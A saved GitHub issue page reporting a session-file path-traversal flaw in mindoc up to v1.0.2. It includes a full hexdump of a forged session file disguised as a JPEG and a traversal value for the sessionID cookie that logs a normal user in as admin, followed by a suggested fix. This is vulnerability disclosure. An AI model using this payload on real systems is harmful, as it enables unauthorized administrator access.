=== Content from github.com_ddc35e08_20250125_033547.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmindoc-org%2Fmindoc%2Fissues%2F384)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmindoc-org%2Fmindoc%2Fissues%2F384)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=mindoc-org%2Fmindoc)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mindoc-org](/mindoc-org)
/
**[mindoc](/mindoc-org/mindoc)**
Public

* [Notifications](/login?return_to=%2Fmindoc-org%2Fmindoc) You must be signed in to change notification settings
* [Fork
  1.9k](/login?return_to=%2Fmindoc-org%2Fmindoc)
* [Star
   7.4k](/login?return_to=%2Fmindoc-org%2Fmindoc)

* [Code](/mindoc-org/mindoc)
* [Issues
  302](/mindoc-org/mindoc/issues)
* [Pull requests
  3](/mindoc-org/mindoc/pulls)
* [Discussions](/mindoc-org/mindoc/discussions)
* [Actions](/mindoc-org/mindoc/actions)
* [Projects
  1](/mindoc-org/mindoc/projects)
* [Wiki](/mindoc-org/mindoc/wiki)
* [Security](/mindoc-org/mindoc/security)
* [Insights](/mindoc-org/mindoc/pulse)

Additional navigation options

* [Code](/mindoc-org/mindoc)
* [Issues](/mindoc-org/mindoc/issues)
* [Pull requests](/mindoc-org/mindoc/pulls)
* [Discussions](/mindoc-org/mindoc/discussions)
* [Actions](/mindoc-org/mindoc/actions)
* [Projects](/mindoc-org/mindoc/projects)
* [Wiki](/mindoc-org/mindoc/wiki)
* [Security](/mindoc-org/mindoc/security)
* [Insights](/mindoc-org/mindoc/pulse)

# allow attacker unauthorized access to user account #384

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[allow attacker unauthorized access to user account](#top)#384Copy linkLabels[Bug系统BUG](https://github.com/mindoc-org/mindoc/issues?q=state%3Aopen%20label%3A%22Bug%22)系统BUG[![@impakho](https://avatars.githubusercontent.com/u/14071148?u=81056b5ab23bc70c2db90fabd563aea497096d7d&v=4&size=80)](/impakho)
## Description

[![@impakho](https://avatars.githubusercontent.com/u/14071148?u=81056b5ab23bc70c2db90fabd563aea497096d7d&v=4&size=48)](/impakho)[impakho](https://github.com/impakho)opened [on Nov 8, 2018](https://github.com/mindoc-org/mindoc/issues/384#issue-378770073)
# Target

mindoc <= v1.0.2

# Description

login as a normal user, use markdown editor to upload `payload.jpg`(exploit session file, login as `admin`)

payload.jpg: (in hexdump)

```
0000000 0e ff 81 04 01 02 ff 82 00 01 10 01 10 00 00 fe
0000010 01 5a ff 82 00 03 06 73 74 72 69 6e 67 0c 05 00
0000020 03 75 69 64 03 69 6e 74 04 02 00 02 06 73 74 72
0000030 69 6e 67 0c 0d 00 0b 5f 5f 63 61 70 74 63 68 61
0000040 5f 5f 06 73 74 72 69 6e 67 0c 06 00 04 71 5a 41
0000050 52 06 73 74 72 69 6e 67 0c 12 00 10 4c 6f 67 69
0000060 6e 53 65 73 73 69 6f 6e 4e 61 6d 65 29 67 69 74
0000070 68 75 62 2e 63 6f 6d 2f 6c 69 66 65 69 36 36 37
0000080 31 2f 6d 69 6e 64 6f 63 2f 6d 6f 64 65 6c 73 2e
0000090 4d 65 6d 62 65 72 ff 83 03 01 01 06 4d 65 6d 62
00000a0 65 72 01 ff 84 00 01 0f 01 08 4d 65 6d 62 65 72
00000b0 49 64 01 04 00 01 07 41 63 63 6f 75 6e 74 01 0c
00000c0 00 01 08 52 65 61 6c 4e 61 6d 65 01 0c 00 01 08
00000d0 50 61 73 73 77 6f 72 64 01 0c 00 01 0a 41 75 74
00000e0 68 4d 65 74 68 6f 64 01 0c 00 01 0b 44 65 73 63
00000f0 72 69 70 74 69 6f 6e 01 0c 00 01 05 45 6d 61 69
0000100 6c 01 0c 00 01 05 50 68 6f 6e 65 01 0c 00 01 06
0000110 41 76 61 74 61 72 01 0c 00 01 04 52 6f 6c 65 01
0000120 04 00 01 08 52 6f 6c 65 4e 61 6d 65 01 0c 00 01
0000130 06 53 74 61 74 75 73 01 04 00 01 0a 43 72 65 61
0000140 74 65 54 69 6d 65 01 ff 86 00 01 08 43 72 65 61
0000150 74 65 41 74 01 04 00 01 0d 4c 61 73 74 4c 6f 67
0000160 69 6e 54 69 6d 65 01 ff 86 00 00 00 10 ff 85 05
0000170 01 01 04 54 69 6d 65 01 ff 86 00 00 00 fe 01 2c
0000180 ff 84 fe 01 27 01 02 01 05 61 64 6d 69 6e 02 ff
0000190 c1 63 4b 61 36 49 35 5a 70 6e 43 4b 43 54 71 71
00001a0 30 72 6c 56 6e 4f 75 32 7a 6c 48 69 46 74 72 38
00001b0 4e 2d 72 52 31 4b 52 65 72 56 79 75 6c 74 78 4c
00001c0 55 42 59 55 2d 52 48 30 7a 5f 6d 78 5a 38 45 59
00001d0 4a 72 79 61 5f 24 31 35 24 32 34 33 33 31 61 32
00001e0 32 63 39 38 64 66 34 65 62 36 63 31 33 33 30 32
00001f0 37 62 64 31 30 37 31 38 31 37 30 63 37 36 36 34
0000200 30 30 62 64 33 33 65 64 34 31 38 61 66 63 62 34
0000210 37 24 36 30 39 35 31 33 36 39 33 35 65 63 36 35
0000220 66 34 64 36 65 33 37 30 38 36 33 37 31 64 61 31
0000230 32 64 61 61 32 32 30 61 32 65 34 38 34 65 34 32
0000240 33 63 35 65 33 66 31 30 35 39 63 36 32 36 31 39
0000250 63 32 01 05 6c 6f 63 61 6c 02 0f 61 64 6d 69 6e
0000260 40 69 6d 69 6e 68 6f 2e 6d 65 02 1d 2f 73 74 61
0000270 74 69 63 2f 69 6d 61 67 65 73 2f 68 65 61 64 69
0000280 6d 67 75 72 6c 2e 6a 70 67 04 0f 01 00 00 00 0e
0000290 d3 75 dd 8f 36 6c 00 ef ff ff 02 0f 01 00 00 00
00002a0 0e d3 75 de 3e 36 05 5a e0 fe d4 00
00002ac

```

[![image](https://user-images.githubusercontent.com/14071148/48205706-9e51ba80-e3a7-11e8-83e1-59999ca2275b.png)](https://user-images.githubusercontent.com/14071148/48205706-9e51ba80-e3a7-11e8-83e1-59999ca2275b.png)

it return upload file path: `https://cdn.iminho.me/uploads/blog/201811/attach_15652cb8d168634f.jpg`

before modify `sessionID`, you're login as `test123`(normal account).

[![2](https://user-images.githubusercontent.com/14071148/48206191-c7bf1600-e3a8-11e8-98f3-a16bcd101ab5.png)](https://user-images.githubusercontent.com/14071148/48206191-c7bf1600-e3a8-11e8-98f3-a16bcd101ab5.png)

modify `sessionID` to `aa/../../../../../uploads/blog/201811/attach_15652cb8d168634f.jpg`

[![3](https://user-images.githubusercontent.com/14071148/48206211-d3124180-e3a8-11e8-8f7c-03b99fa71b85.png)](https://user-images.githubusercontent.com/14071148/48206211-d3124180-e3a8-11e8-8f7c-03b99fa71b85.png)

after modify `sessionID`, you're login as `admin`(super admin account).

# Solution

check `sessionID`, only allow [a-zA-Z0-9]

# Reference

[astaxie/beego#3383](https://github.com/astaxie/beego/issues/3383)

## Metadata

### Assignees

No one assigned

### Labels

[Bug系统BUG](https://github.com/mindoc-org/mindoc/issues?q=state%3Aopen%20label%3A%22Bug%22)系统BUG
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


